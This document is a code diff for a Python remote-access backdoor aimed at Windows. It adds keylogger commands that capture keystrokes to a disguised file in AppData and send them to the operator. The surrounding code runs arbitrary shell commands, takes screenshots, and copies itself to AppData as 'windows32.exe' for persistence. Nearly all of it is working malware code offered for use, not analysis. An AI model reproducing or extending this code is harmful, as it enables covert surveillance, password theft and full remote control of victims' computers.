@@ -10,6 +10,8 @@ import sys
 import time
 import requests
 from mss import mss
+import threading
+import keylogger
 
 def reliable_send(data):
     json_data = json.dumps(data)
@@ -66,6 +68,8 @@ def shell():
             start path --> Srart a program on target pc
             screenshot --> take a screenshot of targets monitor
             check --> check privileges
+            keylog_start --> Start the keylogger
+            keylog_dump --> Dump the keystrokes from keylogger
             q --> Exit reverse shell
             '''
             reliable_send(help_options)
@@ -107,11 +111,18 @@ def shell():
                 reliable_send(admin)
             except:
                 reliable_send("Cant perform the check")
+        elif command[:12] == "keylog_start":
+            t1 = threading.Thread(target=keylogger.start)
+            t1.start()
+        elif command[:11] == "keylog_dump":
+            fn = open(keylogger_path, "r")
+            reliable_send(fn.read())
         else:
             proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             result = proc.stdout.read() + proc.stderr.read()
             reliable_send(result)
 
+keylogger_path = os.environ["appdata"] + "\\processmanager.txt"
 location = os.environ["appdata"] + "\\windows32.exe"
 if not os.path.exists(location):
     shutil.copyfile(sys.executable, location)
